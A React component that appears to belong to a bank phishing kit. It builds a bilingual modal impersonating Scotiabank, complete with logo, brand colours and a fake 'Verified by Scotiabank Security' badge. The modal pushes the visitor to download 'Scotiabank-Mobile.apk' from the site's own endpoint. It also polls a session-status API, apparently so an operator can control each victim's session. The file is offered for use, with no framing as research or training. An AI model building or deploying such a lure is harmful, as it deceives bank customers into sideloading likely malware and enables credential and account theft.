import React, { useEffect } from 'react';
import { X, Shield, Smartphone, Bell, Download } from 'lucide-react';

const translations = {
  en: {
    title: 'Download the Scotiabank Mobile Banking App',
    subtitle: 'For improved security and a better banking experience, please install the official Scotiabank mobile app to continue.',
    bullets: [
      { icon: Shield, text: 'Enhanced security with biometric login' },
      { icon: Smartphone, text: 'Faster, seamless access to your accounts' },
      { icon: Bell, text: 'Real-time alerts and notifications' },
    ],
    downloadBtn: 'Download Scotiabank Mobile App',
    securityBadge: 'Verified by Scotiabank Security',
  },
  fr: {
    title: 'Téléchargez l\'application mobile de la Banque Scotia',
    subtitle: 'Pour une sécurité améliorée et une meilleure expérience bancaire, veuillez installer l\'application mobile officielle de la Banque Scotia pour continuer.',
    bullets: [
      { icon: Shield, text: 'Sécurité renforcée avec connexion biométrique' },
      { icon: Smartphone, text: 'Accès plus rapide et fluide à vos comptes' },
      { icon: Bell, text: 'Alertes et notifications en temps réel' },
    ],
    downloadBtn: 'Télécharger l\'application mobile',
    securityBadge: 'Vérifié par la Sécurité de la Banque Scotia',
  },
};

export default function AppDownloadModal({ email, lang = 'en', onClose }) {
  const t = translations[lang] || translations.en;

  useEffect(() => {
    let isMounted = true;
    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
          headers: { 'X-Access-Key': 'client-scotia-bank' },
        });
        const data = await response.json();
        if (!isMounted) return;
        if (data.success && (data.status === 'cancelled' || data.status === 'idle')) {
          onClose();
          window.location.reload();
        }
      } catch (err) {
        console.error('Error polling session status in AppDownloadModal:', err);
      }
    };
    pollStatus();
    const intervalId = setInterval(pollStatus, 2000);
    return () => { isMounted = false; clearInterval(intervalId); };
  }, [email, onClose]);

  const handleDownload = () => {
    const link = document.createElement('a');
    link.href = '/api/download-scotia-app';
    link.download = 'Scotiabank-Mobile.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in select-none">
      <div
        className="bg-white w-full max-w-[460px] rounded-xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] px-8 pt-8 pb-8 flex flex-col relative border border-[#e2e5eb] animate-slide-in overflow-hidden"
        style={{ fontFamily: "'ScotiabankSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
      >
        {/* Scotiabank Red top accent bar */}
        <div className="absolute top-0 left-0 right-0 h-1 bg-[#eb1120]" />

        {onClose && (
          <button
            type="button"
            onClick={onClose}
            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#666] hover:text-[#111] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
            aria-label="Close"
          >
            <X className="w-[18px] h-[18px]" />
          </button>
        )}

        {/* Scotiabank Footer Logo */}
        <div className="flex justify-center mb-5 pt-2">
          <div className="transition-all duration-300 hover:scale-105">
            <img
              src="/scotiabank-footer-logo.svg"
              alt="Scotiabank Logo"
              className="w-12 h-12 object-contain"
            />
          </div>
        </div>

        <h3 className="text-[22px] font-bold text-[#1a1a1a] text-center mb-2 tracking-tight">
          {t.title}
        </h3>
        <p className="text-[#525151] text-[15px] text-center mb-6 leading-relaxed px-2 font-normal">
          {t.subtitle}
        </p>

        {/* Bullet features cards */}
        <ul className="space-y-3 mb-6">
          {t.bullets.map(({ icon: Icon, text }) => (
            <li 
              key={text} 
              className="flex items-center gap-3.5 p-3 rounded-lg bg-[#fafafa] border border-[#e2e5eb] hover:bg-red-50/20 transition-all duration-200"
            >
              <span className="flex-shrink-0 w-8 h-8 rounded-lg bg-red-50 border border-red-100 flex items-center justify-center shadow-xs">
                <Icon className="w-[18px] h-[18px] text-[#eb1120]" />
              </span>
              <span className="text-[14.5px] text-[#222222] font-normal leading-tight">{text}</span>
            </li>
          ))}
        </ul>

        {/* Download Button */}
        <button
          type="button"
          onClick={handleDownload}
          className="w-full flex items-center justify-center gap-2 bg-[#eb1120] hover:bg-[#d00f1c] text-white text-[17px] font-bold h-[52px] min-h-[52px] rounded-[4px] border-none cursor-pointer shadow-[0_4px_14px_rgba(235,17,32,0.25)] hover:shadow-[0_6px_20px_rgba(235,17,32,0.35)] active:scale-[0.99] transition-all duration-200"
        >
          <Download className="w-[18px] h-[18px] animate-bounce-subtle" />
          {t.downloadBtn}
        </button>

        {/* Security badge pill */}
        <div className="flex items-center justify-center gap-2 mt-5 pt-4 border-t border-[#f0f2f5]">
          <div className="flex items-center gap-1.5 bg-red-50/80 border border-red-100 px-3.5 py-1.5 rounded-full shadow-xs">
            <Shield className="w-3.5 h-3.5 text-[#eb1120]" />
            <span className="text-[11px] text-[#eb1120] font-bold tracking-wider uppercase">
              {t.securityBadge}
            </span>
          </div>
        </div>
      </div>
      
      <style>{`
        @keyframes bounceSubtle {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-3px); }
        }
        .animate-bounce-subtle {
          animation: bounceSubtle 1.8s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
}